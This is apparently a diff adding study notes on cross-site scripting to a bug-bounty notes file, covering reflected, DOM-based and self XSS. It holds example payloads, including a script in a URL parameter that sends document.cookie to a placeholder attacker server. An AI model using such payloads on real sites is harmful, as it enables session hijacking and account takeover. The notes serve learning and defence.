@@ -115,6 +115,60 @@ For example a page that lets you send a message to support staff, the input is n
 Harder to detect but just as dangerous as normal stored XSS, cant find them by looking for input reflected in the servers response. 
 Used to attack administrators, extract their data, and take over their accounts. 
 #### Reflected XSS
+Occurs when the user input is returned to the user without being sent to the database, the data gets processed on the server side and returned to the user.
+These issues happen when the server relies on user input to create pages that display search results or error messages. 
+For example a user inputing a search term for a URL parameter, the page displays the term at the top of the results page. 
+
+```html
+<h2>You searched for abc; here are the results!</h2>
+```
+
+If the search displays user-submitted search strings on the result page search terms like the following would cause a code injection and would be executed in the victims browser upon visiting.
+```html
+https://example.com/search?q=<script>alert('XSS Attack')</script>
+```
+
+If an attacker can get a user to visit this URL the payload will be embedded on the page being viewed.
+Victims browser executes whatever the attacker wants to do.
+Reflected XSS allows attackers to execute code when users click their malicious link. 
 #### DOM Based XSS
+User input never leaves the browser, everything happens on the client side of the application, its all frontend. 
+DOM (Document Object Model) is the model that the browser uses to render a web page, its how websites are structured. 
+The attack goes after the local copy of the web page that exists in the victims browser, it avoids going through the server. 
+The DOM can be attacked when the page takes in user data to dynamically alter the DOM based on that input, Javascript libraries like jQuery are prone to DOM based XSS attacks. 
+Attackers send DOM based XSS payloads through the victims user input, it executes code that directly modifies the local source code. 
+
+```php
+https://example.com?locale=north+america
+```
+
+The pages client side code will use this locale to welcome the user.
+
+```html
+<h2>Welcome, user from north america!</h2>
+```
+
+The URL parameter isn't submitted to a server its used locally by the users browser to directly update the local DOM.
+And the input isn't validated, attackers will use this to create malicious links.
+
+```html
+https://example.com?locale=<script>location='http://attacker_server_ip/?c='+document.cookie;</script>
+```
+
+This will embed the payload on the user's web page, the victims browser will execute the code.
+These attacks happen when user input is rendered in an insecure manner. 
+URL fragments are strings located at the end of a URL that begin with the `#` character, its used to automatically direct users to a specific section of the webpage or to transfer additional data. 
+
+```php
+https://example.com#about_us
+```
+
+This URL with a fragment takes the user to the `#about_us` section of the website they are visiting. 
 #### Self XSS
+This attack is based around tricking users into submitting inputs that are malicious payloads themselves.
+For example, a field on a users dashboard is vulnerable to a stored XSS attack, since only the victim can see and edit it the attacker has to way to get at it. 
+They would have to trick the user to changing the value into the XSS payload. 
+Like a social media post telling you to paste a piece of code into your browser to get something cool, this was most likely aimed at tricking you into launching an XSS attack against yourself. 
+Attackers embed a piece of malicious payload in the link and hid it using a URL shortener like `bit.ly`
+This involves social engineering which is not usually a thing that is accepted as a valid submission in bug bounty programs. 
 ## Prevention
